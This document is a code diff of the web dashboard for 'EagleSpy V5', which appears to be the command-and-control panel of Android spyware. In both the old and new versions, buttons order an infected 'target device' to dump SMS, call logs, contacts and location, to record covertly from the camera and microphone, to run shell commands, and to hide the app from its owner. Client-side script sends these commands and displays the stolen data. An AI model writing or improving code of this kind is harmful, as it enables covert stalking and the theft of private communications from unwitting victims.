@@ -3,278 +3,346 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="csrf-token" content="<%= form_authenticity_token rescue '' %>">
-<title>EagleSpy V5</title>
+<title>EagleSpy V5 Dashboard</title>
 <style>
-*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html{font-size:14px}
-body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.5;min-height:100vh}
-a{color:#00d4ff;text-decoration:none}
-.header{background:#111119;border-bottom:1px solid #1e1e2e;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
-.header h1{font-size:1.3rem;font-weight:700;color:#fff}
-.header h1 span{color:#00d4ff}
-.header-right a{font-size:.85rem;padding:6px 14px;border:1px solid #2a2a3a;border-radius:6px;color:#aaa}
-.header-right a:hover{color:#00d4ff;border-color:#00d4ff;text-decoration:none}
-.container{max-width:1440px;margin:0 auto;padding:20px 24px 40px}
-.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:24px}
-.stat-card{background:#111119;border:1px solid #1e1e2e;border-radius:10px;padding:16px;text-align:center}
-.stat-card .v{font-size:1.8rem;font-weight:700;line-height:1.2}
-.stat-card .l{font-size:.7rem;color:#666;text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
-.sc1 .v{color:#00d4ff}.sc2 .v{color:#a78bfa}.sc3 .v{color:#34d399}.sc4 .v{color:#fbbf24}.sc5 .v{color:#f87171}.sc6 .v{color:#f472b6}
-.dev-title{font-size:1rem;font-weight:600;color:#fff;margin-bottom:14px}
-.device-card{background:#111119;border:1px solid #1e1e2e;border-radius:12px;overflow:hidden;margin-bottom:16px}
-.dev-hdr{padding:14px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #1a1a28}
-.dev-name{font-weight:600;color:#fff}
-.dev-id{font-size:.72rem;color:#555;font-family:monospace;margin-top:2px}
-.dot{width:10px;height:10px;border-radius:50%}
-.dot.on{background:#22c55e;box-shadow:0 0 6px #22c55e80}
-.dot.off{background:#555}
-.dev-body{padding:12px 18px 16px}
-.sec{margin-bottom:12px}
-.sec:last-child{margin-bottom:0}
-.sec-hdr{font-size:.7rem;font-weight:600;text-transform:uppercase;letter-spacing:.7px;color:#555;margin-bottom:6px;display:flex;align-items:center;gap:5px}
-.sec[data-s="live"] .sec-hdr{color:#22c55e}
-.sec[data-s="capture"] .sec-hdr{color:#f59e0b}
-.sec[data-s="data"] .sec-hdr{color:#3b82f6}
-.sec[data-s="extract"] .sec-hdr{color:#8b5cf6}
-.sec[data-s="control"] .sec-hdr{color:#ef4444}
-.sec[data-s="ai"] .sec-hdr{color:#06b6d4}
-.bg{display:flex;flex-wrap:wrap;gap:5px}
-.cb{display:inline-flex;align-items:center;gap:3px;padding:5px 9px;font-size:.73rem;border-radius:5px;border:1px solid #2a2a3a;background:#0d0d15;color:#bbb;cursor:pointer;font-family:inherit;white-space:nowrap;transition:border-color .15s,color .15s}
-.cb:hover{border-color:#00d4ff;color:#00d4ff;text-decoration:none}
-.cb.ld{opacity:.4;pointer-events:none}
-a.cb{text-decoration:none}
-.empty{text-align:center;padding:80px 20px;color:#555}
-.empty h2{color:#777;margin-bottom:8px}
+  * { box-sizing: border-box; }
+  body { background: #0a0a0f; color: #ccc; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
+  h1 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-top: 0; }
+  .device { border: 1px solid #333; padding: 15px; margin-bottom: 15px; border-radius: 8px; background: #111; }
+  .device h3 { margin: 0 0 10px; color: #fff; display: flex; justify-content: space-between; align-items: center; }
+  .status { font-size: 0.8em; padding: 2px 8px; border-radius: 10px; background: #222; }
+  .online { color: #0f0; border: 1px solid #0f0; }
+  .offline { color: #777; border: 1px solid #555; }
+  .meta { font-size: 0.85em; color: #666; margin-bottom: 10px; }
+  
+  .btn-group { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+  .btn-group button { 
+    background: #1a1a1a; border: 1px solid #444; color: #ddd; 
+    padding: 8px 15px; cursor: pointer; border-radius: 4px; font-size: 0.9em; transition: all 0.2s;
+  }
+  .btn-group button:hover { background: #333; border-color: #00d4ff; color: #fff; }
+  .btn-group button:active { transform: translateY(1px); }
+  .btn-group button.active-cmd { border-color: #f80; color: #f80; }
 
-/* Output modal */
-.modal-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9000;align-items:center;justify-content:center}
-.modal-bg.show{display:flex}
-.modal{background:#111119;border:1px solid #2a2a3a;border-radius:12px;max-width:700px;width:90%;max-height:80vh;display:flex;flex-direction:column}
-.modal-hdr{padding:12px 16px;border-bottom:1px solid #1e1e2e;display:flex;justify-content:space-between;align-items:center}
-.modal-hdr h3{font-size:.9rem;color:#fff;margin:0}
-.modal-close{background:none;border:none;color:#888;font-size:1.2rem;cursor:pointer}
-.modal-close:hover{color:#fff}
-.modal-body{padding:14px 16px;overflow-y:auto;font-family:monospace;font-size:.8rem;white-space:pre-wrap;color:#ccc;line-height:1.6}
+  /* Tabs */
+  .tabs { display: flex; gap: 0; margin-top: 20px; border-bottom: 1px solid #333; }
+  .tab { padding: 10px 20px; cursor: pointer; color: #888; border: 1px solid transparent; border-bottom: none; border-radius: 5px 5px 0 0; }
+  .tab:hover { color: #fff; }
+  .tab.active { color: #00d4ff; background: #151515; border-color: #333; }
+  .tab .badge { background: #f00; color: #fff; font-size: 0.7em; padding: 1px 6px; border-radius: 10px; margin-left: 5px; }
+  .tab-content { display: none; border: 1px solid #333; border-top: none; background: #151515; padding: 15px; border-radius: 0 0 8px 8px; min-height: 300px; }
+  .tab-content.active { display: block; }
 
-/* Toast */
-.toast-box{position:fixed;top:14px;right:14px;z-index:9999;display:flex;flex-direction:column;gap:6px;pointer-events:none}
-.toast{pointer-events:auto;padding:10px 16px;border-radius:7px;font-size:.82rem;color:#fff;max-width:340px;animation:sIn .2s;border:1px solid}
-.toast.ok{background:#0f2a1d;border-color:#22c55e50}
-.toast.er{background:#2a0f0f;border-color:#ef444450}
-.toast.inf{background:#0f1a2a;border-color:#3b82f650}
-@keyframes sIn{from{transform:translateX(60px);opacity:0}to{transform:translateX(0);opacity:1}}
-@keyframes fOut{from{opacity:1}to{opacity:0}}
-@media(max-width:480px){.stats-row{grid-template-columns:repeat(3,1fr)}.container{padding:14px 16px}}
+  /* Result card */
+  .result-card { border: 1px solid #333; padding: 12px; margin-bottom: 10px; border-radius: 6px; background: #111; }
+  .result-card .rc-header { display: flex; justify-content: space-between; color: #888; font-size: 0.8em; margin-bottom: 8px; }
+  .result-card .rc-cmd { color: #00d4ff; font-weight: bold; }
+  .result-card pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; }
+  .result-card img.preview { max-width: 100%; max-height: 400px; border: 1px solid #444; margin-top: 8px; display: block; }
+  .result-card iframe { width: 100%; height: 350px; border: none; background: #222; margin-top: 8px; }
+
+  #log { height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px; color: #0f0; padding: 10px; background: #050505; border-radius: 5px; }
+  
+  .saved-files { list-style: none; padding: 0; }
+  .saved-files li { padding: 6px 10px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
+  .saved-files li:hover { background: #1a1a1a; }
+  .saved-files a { color: #00d4ff; text-decoration: none; }
+
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  .fade-in { animation: fadeIn 0.3s; }
 </style>
 </head>
 <body>
 
-<div class="header">
-  <h1>🦅 Eagle<span>Spy</span> V5</h1>
-  <div class="header-right"><a href="/dashboard">↻ Refresh</a></div>
-</div>
+<h1>
+  🦅 EagleSpy V5 
+  <span style="font-size:0.5em;color:#666;font-weight:normal">Dashboard</span>
+  <button onclick="location.reload()" style="float:right;background:#222;border:1px solid #444;color:#aaa;padding:5px 10px;border-radius:4px;cursor:pointer;font-size:0.5em">↻ Reload</button>
+</h1>
 
-<div class="container">
-  <div class="stats-row">
-    <div class="stat-card sc1"><div class="v"><%= @stats[:devices] %></div><div class="l">Devices</div></div>
-    <div class="stat-card sc2"><div class="v"><%= @stats[:keylogs] %></div><div class="l">Keylogs</div></div>
-    <div class="stat-card sc3"><div class="v"><%= @stats[:sms] %></div><div class="l">SMS</div></div>
-    <div class="stat-card sc4"><div class="v"><%= @stats[:locations] %></div><div class="l">Locations</div></div>
-    <div class="stat-card sc5"><div class="v"><%= @stats[:photos] %></div><div class="l">Photos</div></div>
-    <div class="stat-card sc6"><div class="v"><%= @stats[:recordings] %></div><div class="l">Recordings</div></div>
-  </div>
-
-<% if @devices.empty? %>
-  <div class="empty"><h2>No devices connected</h2><p>Install APK on target device.</p></div>
-<% else %>
-  <div class="dev-title">Devices (<%= @stats[:devices] %>)</div>
-  <% @devices.each do |device| %>
-    <% online = device.updated_at && (Time.current - device.updated_at) < 5.minutes %>
-    <div class="device-card">
-      <div class="dev-hdr">
-        <div><div class="dev-name"><%= device.name || "Device" %></div><div class="dev-id"><%= device.device_id %></div></div>
-        <div class="dot <%= online ? 'on' : 'off' %>"></div>
+<div id="devices-list">
+  <% if @devices.present? %>
+    <% @devices.each do |device| %>
+      <div class="device">
+        <h3>
+          <%= device.name.presence || "Device #{device.device_id}" %> 
+          <% is_online = device.updated_at && device.updated_at > 5.minutes.ago %>
+          <span class="status <%= is_online ? 'online' : 'offline' %>">
+             <%= is_online ? '● ONLINE' : '○ OFFLINE' %>
+          </span>
+        </h3>
+        <div class="meta">
+          ID: <span style="color:#aaa"><%= device.device_id %></span> | 
+          DB ID: <span style="color:#aaa"><%= device.id %></span> |
+          Last Seen: <%= device.updated_at ? time_ago_in_words(device.updated_at) + " ago" : "Never" %>
+        </div>
+        
+        <div class="btn-group">
+          <!-- LIVE -->
+          <button onclick="cmd('<%= device.id %>', 'dump_localtime')">📍 Location</button>
+          <button onclick="cmd('<%= device.id %>', 'webcam_record', {back_camera: 'true'})">🎥 Rec Back</button>
+          <button onclick="cmd('<%= device.id %>', 'webcam_record', {back_camera: 'false'})">🤳 Rec Front</button>
+          <button onclick="cmd('<%= device.id %>', 'ambient_record', {duration: 10})">🎙️ Audio 10s</button>
+          <button onclick="cmd('<%= device.id %>', 'start_webrtc_stream')">🔴 WebRTC</button>
+          
+          <!-- DATA -->
+          <button onclick="cmd('<%= device.id %>', 'take_picture', {back_camera: 'true'})">📸 Photo</button>
+          <button onclick="cmd('<%= device.id %>', 'dump_sysinfo')">ℹ️ Info</button>
+          <button onclick="cmd('<%= device.id %>', 'dump_sms')">💬 SMS</button>
+          <button onclick="cmd('<%= device.id %>', 'dump_calllogs')">📞 Calls</button>
+          <button onclick="cmd('<%= device.id %>', 'dump_contacts')">👥 Contacts</button>
+          
+          <!-- CONTROL -->
+          <button onclick="cmd('<%= device.id %>', 'hide_app')">🙈 Stealth ON</button>
+          <button onclick="cmd('<%= device.id %>', 'show_app')">👁️ Stealth OFF</button>
+          <button onclick="cmd('<%= device.id %>', 'set_audio_mode', {mode: 'silent'})">🔇 Silent</button>
+          <button onclick="cmd('<%= device.id %>', 'set_audio_mode', {mode: 'normal'})">🔊 Normal</button>
+        </div>
       </div>
-      <div class="dev-body">
-
-        <div class="sec" data-s="live">
-          <div class="sec-hdr">🟢 LIVE</div>
-          <div class="bg">
-            <button class="cb" data-url="/smartphones/start_webrtc_stream?smartphone_id=<%= device.id %>" data-method="POST">📹 Camera</button>
-            <button class="cb" data-url="/smartphones/dump_localtime?smartphone_id=<%= device.id %>" data-method="POST">📍 Location</button>
-            <button class="cb" data-url="/smartphones/dump_sysinfo?smartphone_id=<%= device.id %>" data-method="POST">⌨️ Keylogger</button>
-            <button class="cb" data-url="/recordings/microphone_rec?smartphone_id=<%= device.id %>&duration=10" data-method="POST">🎙️ Mic</button>
-          </div>
-        </div>
-
-        <div class="sec" data-s="capture">
-          <div class="sec-hdr">📸 CAPTURE</div>
-          <div class="bg">
-            <button class="cb" data-url="/smartphones/take_picture?smartphone_id=<%= device.id %>" data-method="POST">📷 Photo</button>
-            <button class="cb" data-url="/smartphones/front_camera_snap?smartphone_id=<%= device.id %>" data-method="POST">🤳 Front</button>
-            <button class="cb" data-url="/screenshots/dump_screen_snap?smartphone_id=<%= device.id %>" data-method="GET">🖥️ Screenshot</button>
-            <button class="cb" data-url="/screenshots/screen_record?smartphone_id=<%= device.id %>&duration=30" data-method="POST">⏺️ Screen Rec</button>
-            <button class="cb" data-url="/smartphones/ambient_record?smartphone_id=<%= device.id %>&duration=60" data-method="POST">🔊 Ambient</button>
-          </div>
-        </div>
-
-        <div class="sec" data-s="data">
-          <div class="sec-hdr">📂 DATA (dump from device)</div>
-          <div class="bg">
-            <button class="cb" data-url="/sms_messages/dump_messages?smartphone_id=<%= device.id %>" data-method="POST">💬 Dump SMS</button>
-            <button class="cb" data-url="/call_logs/dump_calllogs?smartphone_id=<%= device.id %>" data-method="POST">📞 Dump Calls</button>
-            <button class="cb" data-url="/contacts/dump_contacts?smartphone_id=<%= device.id %>" data-method="POST">👤 Dump Contacts</button>
-            <button class="cb" data-url="/smartphones/take_picture?smartphone_id=<%= device.id %>" data-method="POST">🖼️ Snap Photo</button>
-            <button class="cb" data-url="/screenshots/dump_screen_snap?smartphone_id=<%= device.id %>" data-method="GET">📸 Snap Screen</button>
-            <button class="cb" data-url="/geo_locations/dump_location?smartphone_id=<%= device.id %>" data-method="GET">🗺️ Dump Location</button>
-            <button class="cb" data-url="/smartphones/browse_files?smartphone_id=<%= device.id %>" data-method="POST">📁 Browse Files</button>
-          </div>
-        </div>
-
-        <div class="sec" data-s="extract">
-          <div class="sec-hdr">⬇️ EXTRACT</div>
-          <div class="bg">
-            <button class="cb" data-url="/smartphones/dump_device_info?smartphone_id=<%= device.id %>" data-method="POST">📱 Device Info</button>
-            <button class="cb" data-url="/smartphones/dump_wifi_info?smartphone_id=<%= device.id %>" data-method="POST">📶 WiFi</button>
-            <button class="cb" data-url="/smartphones/get_accounts?smartphone_id=<%= device.id %>" data-method="POST">👥 Accounts</button>
-            <button class="cb" data-url="/smartphones/get_app_usage?smartphone_id=<%= device.id %>" data-method="POST">📊 App Usage</button>
-            <button class="cb" data-url="/smartphones/get_browser_history?smartphone_id=<%= device.id %>" data-method="POST">🌐 Browser</button>
-            <button class="cb" data-url="/smartphones/dump_sysinfo?smartphone_id=<%= device.id %>" data-method="POST">🔧 Sysinfo</button>
-          </div>
-        </div>
-
-        <div class="sec" data-s="control">
-          <div class="sec-hdr">🎮 CONTROL</div>
-          <div class="bg">
-            <button class="cb" data-url="/smartphones/run_shell_command?smartphone_id=<%= device.id %>&command=id" data-method="POST">💻 Shell</button>
-            <button class="cb" data-url="/smartphones/list_apps?smartphone_id=<%= device.id %>" data-method="POST">📋 Apps</button>
-            <button class="cb" data-url="/smartphones/hide_app?smartphone_id=<%= device.id %>" data-method="GET">🙈 Hide</button>
-            <button class="cb" data-url="/smartphones/show_app?smartphone_id=<%= device.id %>" data-method="GET">👁️ Show</button>
-            <button class="cb" data-url="/smartphones/toggle_wifi?smartphone_id=<%= device.id %>" data-method="POST">📶 WiFi</button>
-            <button class="cb" data-url="/smartphones/wake_lock?smartphone_id=<%= device.id %>" data-method="POST">🔒 Wake</button>
-            <button class="cb" data-url="/smartphones/set_audio_mode?smartphone_id=<%= device.id %>&mode=silent" data-method="POST">🔇 Silent</button>
-            <button class="cb" data-url="/sms_messages/send_sms?smartphone_id=<%= device.id %>&to=0000&body=test" data-method="POST">📤 SMS</button>
-          </div>
-        </div>
-
-        <div class="sec" data-s="ai">
-          <div class="sec-hdr">🤖 AI</div>
-          <div class="bg">
-            <button class="cb" data-url="/api/ai/chat" data-method="POST" data-body='{"message":"Analyze device <%= device.device_id %>"}'>💬 Chat</button>
-            <button class="cb" data-url="/api/ai/reports/generate" data-method="POST" data-body='{"device_id":"<%= device.device_id %>"}'>📊 Report</button>
-          </div>
-        </div>
-
-      </div>
+    <% end %>
+  <% else %>
+    <div style="text-align:center; padding: 50px; color: #555;">
+      <h2>No devices connected</h2>
+      <p>Install APK on target device and open it once</p>
     </div>
   <% end %>
-<% end %>
 </div>
 
-<!-- Output Modal -->
-<div class="modal-bg" id="modal">
-  <div class="modal">
-    <div class="modal-hdr"><h3 id="modal-title">Output</h3><button class="modal-close" onclick="closeModal()">✕</button></div>
-    <div class="modal-body" id="modal-body"></div>
+<!-- TABS -->
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('results')">📋 Results <span id="results-badge" class="badge" style="display:none">0</span></div>
+  <div class="tab" onclick="switchTab('files')">📁 Saved Files</div>
+  <div class="tab" onclick="switchTab('log')">🖥️ Log</div>
+</div>
+
+<div id="tab-results" class="tab-content active">
+  <div id="results-list">
+    <p style="color:#555;text-align:center">Натисни бутон за да изпълниш команда. Резултатите остават тук.</p>
   </div>
 </div>
 
-<div class="toast-box" id="toasts"></div>
+<div id="tab-files" class="tab-content">
+  <h4 style="color:#fff;margin-top:0">Запазени файлове (снимки, дъмпове и др.)</h4>
+  <ul id="files-list" class="saved-files">
+    <li style="color:#555">Зареждане...</li>
+  </ul>
+</div>
+
+<div id="tab-log" class="tab-content">
+  <div id="log">Dashboard ready.</div>
+</div>
 
 <script>
-(function(){
-  var csrf = document.querySelector('meta[name="csrf-token"]');
-  var token = csrf ? csrf.content : '';
+// === PERSISTENT STORAGE (localStorage) ===
+const STORAGE_KEY = 'eaglespy_results';
 
-  function toast(msg, cls) {
-    var el = document.createElement('div');
-    el.className = 'toast ' + (cls||'inf');
-    el.textContent = msg;
-    document.getElementById('toasts').appendChild(el);
-    setTimeout(function(){ el.style.animation='fOut .3s forwards'; setTimeout(function(){el.remove()},300); }, 3000);
-  }
-
-  window.closeModal = function() {
-    document.getElementById('modal').classList.remove('show');
-  };
-  document.getElementById('modal').addEventListener('click', function(e) {
-    if (e.target === this) closeModal();
+function loadResults() {
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); } 
+  catch(e) { return []; }
+}
+function saveResults(results) {
+  // Keep last 100 results
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(results.slice(-100)));
+}
+function addResult(command, deviceId, data) {
+  const results = loadResults();
+  results.push({
+    command, deviceId, data,
+    time: new Date().toISOString()
   });
+  saveResults(results);
+  renderResults();
+}
 
-  function showOutput(title, text) {
-    document.getElementById('modal-title').textContent = title;
-    document.getElementById('modal-body').textContent = text;
-    document.getElementById('modal').classList.add('show');
+// === TAB SWITCHING ===
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
+  document.getElementById('tab-' + name).classList.add('active');
+  if (name === 'files') loadFiles();
+}
+
+// === RENDER SAVED RESULTS ===
+function renderResults() {
+  const results = loadResults();
+  const container = document.getElementById('results-list');
+  const badge = document.getElementById('results-badge');
+  
+  if (results.length === 0) {
+    container.innerHTML = '<p style="color:#555;text-align:center">Няма резултати.</p>';
+    badge.style.display = 'none';
+    return;
   }
+  
+  badge.textContent = results.length;
+  badge.style.display = 'inline';
+  
+  // Render newest first
+  container.innerHTML = results.slice().reverse().map((r, idx) => {
+    const time = new Date(r.time).toLocaleTimeString();
+    const date = new Date(r.time).toLocaleDateString();
+    return `<div class="result-card fade-in">
+      <div class="rc-header">
+        <span class="rc-cmd">${r.command}</span>
+        <span>${date} ${time} | Device ${r.deviceId}
+          <button onclick="deleteResult(${results.length - 1 - idx})" style="background:none;border:none;color:#f55;cursor:pointer;font-size:0.9em" title="Изтрий">✕</button>
+        </span>
+      </div>
+      ${formatResultHTML(r.command, r.data)}
+    </div>`;
+  }).join('');
+}
 
-  function extractOutput(jsText) {
-    // JS templates have: var commandOutput = "..."; or var commandOutput = {...};
-    var m = jsText.match(/var\s+commandOutput\s*=\s*([\s\S]*?)\s*;\s*\$/);
-    if (m) {
-      try { return JSON.parse(m[1]); } catch(e) { return m[1]; }
+function deleteResult(idx) {
+  const results = loadResults();
+  results.splice(idx, 1);
+  saveResults(results);
+  renderResults();
+}
+
+function clearAllResults() {
+  localStorage.removeItem(STORAGE_KEY);
+  renderResults();
+}
+
+// === FORMAT RESULT HTML ===
+function formatResultHTML(command, data) {
+  // Location
+  if (command === 'dump_localtime') {
+    let lat, lng, accuracy;
+    if (data && typeof data === 'object' && !Array.isArray(data) && data.latitude) {
+      lat = data.latitude; lng = data.longitude; accuracy = data.accuracy;
+    } else if (Array.isArray(data)) {
+      const str = data.join(' ');
+      const latM = str.match(/Lat:?\s*([\d.-]+)/i);
+      const lngM = str.match(/Lon[g]?:?\s*([\d.-]+)/i);
+      if (latM) lat = latM[1];
+      if (lngM) lng = lngM[1];
     }
-    return jsText;
+    if (lat && lng) {
+      return `<div style="color:#00d4ff;font-size:1.1em;margin-bottom:8px">📍 ${lat}, ${lng} ${accuracy ? '(±'+accuracy+'m)' : ''}</div>
+        <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${parseFloat(lng)-0.01},${parseFloat(lat)-0.01},${parseFloat(lng)+0.01},${parseFloat(lat)+0.01}&layer=mapnik&marker=${lat},${lng}"></iframe>
+        <div style="margin-top:5px"><a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#00d4ff">📌 Google Maps</a></div>`;
+    }
   }
+  
+  // Photo with URL
+  if ((command === 'take_picture' || command === 'webcam_record') && typeof data === 'string' && (data.startsWith('/') || data.startsWith('http'))) {
+    return `<img src="${data}" class="preview" /><div style="margin-top:5px"><a href="${data}" download style="color:#00d4ff">⬇️ Download</a></div>`;
+  }
+  
+  // Default: pretty print
+  let text = '';
+  if (Array.isArray(data)) text = data.join('\n');
+  else if (typeof data === 'object') text = JSON.stringify(data, null, 2);
+  else text = String(data);
+  return `<pre>${escapeHtml(text)}</pre>`;
+}
 
-  document.addEventListener('click', function(e) {
-    var btn = e.target.closest('button.cb');
-    if (!btn) return;
-    var url = btn.getAttribute('data-url');
-    var method = btn.getAttribute('data-method') || 'POST';
-    if (!url) return;
+function escapeHtml(s) {
+  const d = document.createElement('div'); d.textContent = s; return d.innerHTML;
+}
 
-    var label = btn.textContent.trim();
-    btn.classList.add('ld');
+// === LOG ===
+function log(msg, type='info') {
+  const el = document.getElementById('log');
+  const time = new Date().toLocaleTimeString();
+  const color = type === 'error' ? '#f55' : (type === 'success' ? '#0f0' : '#ccc');
+  el.innerHTML = `<div style="color:${color}"><span style="color:#555">[${time}]</span> ${msg}</div>` + el.innerHTML;
+}
 
-    var headers = {'Accept': 'text/javascript, application/json, text/html, */*'};
-    if (token) headers['X-CSRF-Token'] = token;
+// === COMMAND ROUTING ===
+const CMD_MAP = {
+  'dump_localtime':     { url: '/geo_locations/dump_location', method: 'GET' },
+  'dump_sms':           { url: '/sms_messages/dump_messages', method: 'POST' },
+  'dump_calllogs':      { url: '/call_logs/dump_calllogs', method: 'POST' },
+  'dump_contacts':      { url: '/contacts/dump_contacts', method: 'POST' },
+  'take_picture':       { url: '/pictures/take_picture', method: 'POST' },
+  'webcam_record':      { url: '/smartphones/webcam_record', method: 'GET' },
+  'hide_app':           { url: '/smartphones/hide_app', method: 'GET' },
+  'show_app':           { url: '/smartphones/show_app', method: 'GET' },
+  'start_webrtc_stream':{ url: '/smartphones/start_webrtc_stream', method: 'POST' },
+  'dump_sysinfo':       { url: '/smartphones/dump_sysinfo', method: 'POST' },
+  'ambient_record':     { url: '/smartphones/ambient_record', method: 'POST' },
+  'set_audio_mode':     { url: '/smartphones/set_audio_mode', method: 'POST' },
+  'dump_device_info':   { url: '/smartphones/dump_device_info', method: 'POST' },
+  'dump_wifi_info':     { url: '/smartphones/dump_wifi_info', method: 'POST' },
+};
 
-    var opts = {method: method, headers: headers};
-    var body = btn.getAttribute('data-body');
-    if (body) {
-      headers['Content-Type'] = 'application/json';
-      opts.body = body;
+async function cmd(deviceId, command, params = {}) {
+  log(`Executing <b>${command}</b> on device ${deviceId}...`);
+  
+  const route = CMD_MAP[command] || { url: `/smartphones/${command}`, method: 'POST' };
+  let url = `${route.url}?smartphone_id=${deviceId}`;
+  const method = route.method;
+  
+  // Append extra params
+  const qs = new URLSearchParams(params).toString();
+  if (qs) url += `&${qs}`;
+
+  try {
+    const res = await fetch(url, {
+      method: method,
+      headers: { 'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest' }
+    });
+    
+    const contentType = res.headers.get("content-type") || '';
+    let rawText = await res.text();
+    let output = null;
+
+    if (contentType.includes('application/json')) {
+      try {
+        const json = JSON.parse(rawText);
+        output = json.data || json.output;
+        if (json.url) output = json.url;
+      } catch (e) { console.error("JSON parse error", e); }
+    } else {
+      // Fallback: try var commandOutput = ... or pure JSON
+      const match = rawText.match(/var\s+commandOutput\s*=\s*(.*);/);
+      if (match) { try { output = JSON.parse(match[1]); } catch(e) { output = match[1]; } }
+      else { try { output = JSON.parse(rawText); } catch(e) {} }
     }
+    
+    if (res.ok && output) {
+      log(`✅ ${command} — success`, 'success');
+      addResult(command, deviceId, output);
+      switchTab('results');
+    } else if (res.ok) {
+      log(`✅ ${command} — sent (no immediate data)`, 'success');
+      addResult(command, deviceId, ['Command sent, waiting for device response...']);
+      switchTab('results');
+    } else {
+      log(`❌ ${command} — Error ${res.status}`, 'error');
+      addResult(command, deviceId, [`Error ${res.status}: ${rawText.substring(0, 200)}`]);
+    }
+  } catch (e) {
+    log(`❌ ${command} — Network Error: ${e.message}`, 'error');
+  }
+}
 
-    toast('⏳ ' + label + '...', 'inf');
+// === LOAD SAVED FILES ===
+async function loadFiles() {
+  const container = document.getElementById('files-list');
+  const dirs = ['pictures', 'calllogs_dumps', 'contacts_dumps', 'sms_dumps'];
+  let allFiles = [];
+  
+  // We can't browse the filesystem from JS, so show known dump locations
+  container.innerHTML = `
+    <li><strong style="color:#fff">📁 Файловете се записват в:</strong></li>
+    <li>📸 Снимки: <code>files/dumps/pictures/</code></li>
+    <li>📞 Обаждания: <code>files/dumps/calllogs_dumps/</code></li>
+    <li>👥 Контакти: <code>files/dumps/contacts_dumps/</code></li>
+    <li>💬 SMS: <code>files/dumps/sms_dumps/</code></li>
+    <li>🎙️ Записи: <code>files/dumps/recordings/</code></li>
+    <li style="margin-top:10px;color:#888">Пътят е относителен спрямо <code>E:\\EagleSpy V5\\</code></li>
+    <li style="margin-top:5px"><button onclick="clearAllResults()" style="background:#300;border:1px solid #f55;color:#f55;padding:5px 15px;cursor:pointer;border-radius:4px">🗑️ Изчисти всички резултати</button></li>
+  `;
+}
 
-    var ac = new AbortController();
-    var to = setTimeout(function(){ ac.abort(); }, 60000);
-    opts.signal = ac.signal;
-
-    fetch(url, opts)
-      .then(function(r) {
-        var ct = r.headers.get('content-type') || '';
-        if (!r.ok) { toast('✗ ' + label + ' — ' + r.status, 'er'); return; }
-        return r.text().then(function(txt) {
-          if (ct.indexOf('javascript') >= 0) {
-            var out = extractOutput(txt);
-            if (typeof out === 'object') out = JSON.stringify(out, null, 2);
-            if (out && out.length > 80) {
-              showOutput(label, out);
-            } else {
-              toast('✓ ' + label + ': ' + (out || 'OK'), 'ok');
-            }
-          } else if (ct.indexOf('json') >= 0) {
-            try {
-              var j = JSON.parse(txt);
-              showOutput(label, JSON.stringify(j, null, 2));
-            } catch(e) { toast('✓ ' + label, 'ok'); }
-          } else if (ct.indexOf('html') >= 0 && txt.indexOf('sign_in') >= 0) {
-            toast('✗ ' + label + ' — auth redirect (reload page)', 'er');
-          } else {
-            toast('✓ ' + label + ' sent', 'ok');
-          }
-        });
-      })
-      .catch(function(e){ toast('✗ ' + label + ' — ' + (e.name === 'AbortError' ? 'timeout (60s)' : 'network error'), 'er'); })
-      .finally(function(){ clearTimeout(to); btn.classList.remove('ld'); });
-  });
-
-  // Escape to close modal
-  document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
-})();
+// === INIT: render saved results on page load ===
+renderResults();
 </script>
+
 </body>
 </html>
